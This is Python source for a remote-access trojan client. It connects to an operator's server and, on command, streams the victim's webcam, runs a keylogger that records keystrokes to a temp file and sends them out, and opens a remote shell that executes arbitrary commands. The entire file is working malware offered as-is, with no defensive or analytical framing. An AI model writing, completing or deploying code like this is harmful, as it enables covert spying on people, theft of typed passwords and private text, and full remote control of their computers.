import socket 
import threading
import socket
import cv2
import numpy
import struct
import pickle
from pynput import keyboard
import tempfile
import subprocess
import os

PORT = 8080
# this is you want to run it remotely
# SERVER = '' # ip address

# this is if you want to run on the local machine
SERVER = socket.gethostbyname(socket.gethostname())

ADDR = (SERVER, PORT)

FILE_NAME = tempfile.mkdtemp()+"\key_log.txt"
isCapsOn = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def recWebCam(SERVER):
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) #Capture from webcam
    while True:
        ret, frame = cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        client.sendall(message_size + data)

        # client.close()

def on_press(key):
    fp = open(FILE_NAME, 'a+')
    try:
        if isCapsOn:
            fp.write(key.char.upper())
        else:
            fp.write(key.char)
        fp.close()
    except AttributeError:
        if key == keyboard.Key.tab:
            fp.write('\t')
        if key == keyboard.Key.backspace:
            fp.write('[bsp]')
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            fp.write('[ctrl]')
        if key == keyboard.Key.enter:
            fp.write('\n')
        if key == keyboard.Key.caps_lock:
            isCapsOn != isCapsOn
        fp.close()

listener = keyboard.Listener(on_press=on_press)   

def transfer(s):
    f = open(FILE_NAME, 'rb')
    packet = f.read(1024*1024)#1MB
    while packet != b'':
        client.send(packet) 
        packet = f.read(1024*1024)
    f.close()
    client.send(b'DONE')

def startKeyLogger():
    listener.start()
    
def stopKeyLogger():
    listener.stop()
    transfer(SERVER)

def get_shell(s):
    while True:
        command = client.recv(1024*1024).decode()
        if 'close' in command:
            break

        output = subprocess.getoutput(command)
        
        if output == "":
            client.send(b' ')
        
        if 'cd' in command:
            items = command.split(' ')
            path = items[items.index('cd') + 1]
            os.chdir(path)
            
        client.send(output.encode())

def client_func():
    while True:
        # addr = SERVER
        command = client.recv(1024*1024).decode()
        if 'open_webcam' in command:
            thread = threading.Thread(target=recWebCam, args=(SERVER,))
            thread.start()
        elif 'logger_start' in command:
            thread = threading.Thread(target=startKeyLogger)
            thread.start()
        elif 'logger_end' in command:
            stopKeyLogger()
        elif 'get_shell' in command:
            get_shell(SERVER)
        elif 'terminate' in command:
            client.close()
            break

client_func()